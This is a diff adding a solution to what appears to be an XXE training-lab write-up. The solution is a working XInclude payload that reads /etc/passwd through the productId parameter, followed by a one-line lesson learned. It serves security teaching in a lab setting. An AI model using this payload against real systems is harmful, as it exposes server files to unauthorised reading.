@@ -17,3 +17,19 @@ To solve the lab, inject an `XInclude` statement to retrieve the contents of t
 	By default, `XInclude` will try to parse the included document as XML. Since `/etc/passwd` isn't valid XML, you will need to add an extra attribute to the `XInclude` directive to change this behavior.
 ## Solution
 
+We can use the following xinclude payload to retrieve the contents of the `/etc/passwd` file. 
+
+```text title="Working payload"
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+In repeater, place that payload as the value of the `productId` parameter and send the request. 
+
+![](attachments/xxe-lab-7/file-20251113111712385.png)
+
+This gets the `/etc/passwd` contents and solves the lab.
+
+## Lesson learned
+
+If I cannot control the entire XML document, try XInclude.
